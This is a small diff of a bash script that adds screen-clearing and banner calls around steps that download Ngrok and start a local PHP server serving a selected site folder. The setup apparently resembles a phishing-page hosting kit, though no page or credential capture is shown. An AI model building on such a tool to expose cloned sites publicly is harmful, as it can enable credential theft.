@@ -552,7 +552,8 @@ fi
 if [[ -e ngrok ]]; then
 echo ""
 else
-
+clear
+banner
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -582,7 +583,7 @@ exit 1
 fi
 fi
 fi
-
+banner
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
